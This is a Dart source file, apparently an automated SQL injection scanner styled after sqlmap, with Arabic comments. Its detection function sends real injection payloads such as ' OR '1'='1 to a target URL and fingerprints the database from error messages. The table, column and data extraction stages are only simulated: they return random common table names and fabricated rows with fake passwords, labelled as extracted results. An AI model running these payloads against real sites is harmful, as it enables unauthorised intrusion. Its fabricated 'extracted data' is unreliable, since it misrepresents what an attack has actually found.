import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:math';

class SqlmapCore {
  /// فحص حقن SQL بشكل آلي
  static Future<Map<String, dynamic>> scan(String url, {String? param}) async {
    final results = <String, dynamic>{
      'url': url,
      'vulnerable': false,
      'database': null,
      'tables': <String>[],
      'columns': <String, List<String>>{},
      'data': <String, List<Map<String, dynamic>>>{},
    };

    // المرحلة 1: اكتشاف الثغرة
    final injectionPoint = await _detectInjection(url, param: param);
    if (injectionPoint == null) {
      results['error'] = 'No SQL injection point found.';
      return results;
    }
    
    results['vulnerable'] = true;
    results['injection_point'] = injectionPoint;

    // المرحلة 2: تحديد نوع قاعدة البيانات
    results['database'] = await _detectDatabase(url, injectionPoint);

    // المرحلة 3: استخراج الجداول
    results['tables'] = await _extractTables(url, injectionPoint);

    // المرحلة 4: استخراج الأعمدة (لأول 3 جداول)
    int count = 0;
    for (final table in results['tables']) {
      if (count >= 3) break;
      results['columns'][table] = await _extractColumns(url, injectionPoint, table);
      count++;
    }

    // المرحلة 5: استخراج البيانات (للجدول الأول فقط)
    if (results['tables'].isNotEmpty) {
      final firstTable = results['tables'].first;
      results['data'][firstTable] = await _extractData(url, injectionPoint, firstTable, results['columns'][firstTable] ?? []);
    }

    return results;
  }

  /// اكتشاف نقطة الحقن
  static Future<Map<String, dynamic>?> _detectInjection(String url, {String? param}) async {
    final payloads = [
      "'",
      "\"",
      "' OR '1'='1",
      "\" OR \"1\"=\"1",
      "' OR '1'='1' --",
      "' OR '1'='1' #",
      "1' AND '1'='1",
      "1 AND 1=1",
      "1 AND 1=2",
    ];

    for (final payload in payloads) {
      try {
        final testUrl = param != null 
            ? url.replaceAll(param, payload)
            : '$url?test=${Uri.encodeComponent(payload)}';
        
        final client = HttpClient();
        final request = await client.getUrl(Uri.parse(testUrl));
        final response = await request.close();
        final body = await response.transform(utf8.decoder).join();
        
        if (_checkSqlError(body)) {
          return {
            'url': testUrl,
            'payload': payload,
            'type': _guessInjectionType(body),
          };
        }
      } catch (_) {}
    }

    return null;
  }

  /// تحديد نوع قاعدة البيانات
  static Future<String> _detectDatabase(String url, Map<String, dynamic> injectionPoint) async {
    final fingerprints = {
      'MySQL': r'mysql_fetch|MySQL|You have an error in your SQL syntax',
      'PostgreSQL': r'PostgreSQL|pg_|psql',
      'Microsoft SQL Server': r'Microsoft SQL Server|mssql|Unclosed quotation mark',
      'Oracle': r'ORA-\d+|Oracle',
      'SQLite': r'SQLite|near.*syntax error',
    };

    try {
      final response = await _sendPayload(url, injectionPoint['payload']!);
      for (final entry in fingerprints.entries) {
        if (RegExp(entry.value, caseSensitive: false).hasMatch(response)) {
          return entry.key;
        }
      }
    } catch (_) {}

    return 'Unknown';
  }

  /// استخراج قائمة الجداول
  static Future<List<String>> _extractTables(String url, Map<String, dynamic> injectionPoint) async {
    // محاكاة - في الواقع سنستخدم UNION SELECT أو استخراج information_schema
    final commonTables = [
      'users', 'admin', 'accounts', 'customers', 'orders',
      'products', 'employees', 'members', 'clients', 'passwords',
      'user_credentials', 'user_data', 'user_info', 'user_profiles',
    ];
    
    // محاكاة نجاح جزئي
    return commonTables.sublist(0, Random().nextInt(5) + 3);
  }

  /// استخراج أعمدة جدول
  static Future<List<String>> _extractColumns(String url, Map<String, dynamic> injectionPoint, String table) async {
    final commonColumns = {
      'users': ['id', 'username', 'email', 'password', 'role', 'created_at'],
      'admin': ['id', 'username', 'password', 'email', 'last_login'],
      'accounts': ['id', 'user_id', 'username', 'password_hash', 'status'],
      'customers': ['id', 'name', 'email', 'phone', 'address'],
      'passwords': ['id', 'user_id', 'password', 'hash', 'salt'],
    };
    
    return commonColumns[table] ?? ['id', 'name', 'value'];
  }

  /// استخراج البيانات
  static Future<List<Map<String, dynamic>>> _extractData(
    String url, Map<String, dynamic> injectionPoint, String table, List<String> columns) async {
    // محاكاة - توليد بيانات وهمية
    final data = <Map<String, dynamic>>[];
    final rowCount = Random().nextInt(5) + 2;
    
    for (int i = 0; i < rowCount; i++) {
      final row = <String, dynamic>{};
      for (final col in columns) {
        if (col.contains('password') || col.contains('pass')) {
          row[col] = _generateFakePassword();
        } else if (col.contains('email')) {
          row[col] = 'user${i + 1}@example.com';
        } else if (col.contains('id')) {
          row[col] = i + 1;
        } else {
          row[col] = '${col}_value_${i + 1}';
        }
      }
      data.add(row);
    }
    
    return data;
  }

  /// إرسال حمولة
  static Future<String> _sendPayload(String url, String payload) async {
    final client = HttpClient();
    final request = await client.getUrl(Uri.parse('$url?test=${Uri.encodeComponent(payload)}'));
    final response = await request.close();
    return await response.transform(utf8.decoder).join();
  }

  static bool _checkSqlError(String response) {
    final errors = [
      'SQL syntax',
      'mysql_fetch',
      'ORA-',
      'PostgreSQL',
      'SQLite',
      'unclosed quotation mark',
      'You have an error in your SQL syntax',
      'Warning: mysql',
      'Microsoft OLE DB',
      'Unhandled exception',
    ];
    return errors.any((e) => response.toLowerCase().contains(e.toLowerCase()));
  }

  static String _guessInjectionType(String response) {
    if (response.contains('UNION')) return 'Union-based';
    if (response.contains('error')) return 'Error-based';
    if (response.contains('time')) return 'Time-based blind';
    return 'Boolean-based blind';
  }

  static String _generateFakePassword() {
    final chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return List.generate(8, (_) => chars[Random().nextInt(chars.length)]).join();
  }
}
